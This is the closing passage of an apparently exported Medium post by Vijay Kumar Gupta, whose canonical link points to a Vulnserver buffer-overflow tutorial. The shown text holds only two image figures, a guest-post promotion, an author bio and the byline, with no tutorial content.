class="graf-image" data-image-id="0*l4GN2MEQFw1HxwMK.png"
data-width="552" data-height="77" />
</figure>

<figure id="57bb" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*YiUYvjynlq1AWNFR.png"
class="graf-image" data-image-id="0*YiUYvjynlq1AWNFR.png"
data-width="578" data-height="258" />
</figure>

### Promote and Collaborate on Cybersecurity Insights {#b9ca .graf .graf--h3 .graf-after--figure name="b9ca"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#5e8c .graf .graf--h3 .graf-after--p name="5e8c"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::::
::::::
::::::::
:::::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [August 15, 2024](https://medium.com/p/4d71782e16d7).

[Canonical
link](https://medium.com/@bevijaygupta/stack-based-buffer-overflow-practical-for-windows-vulnserver-4d71782e16d7){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
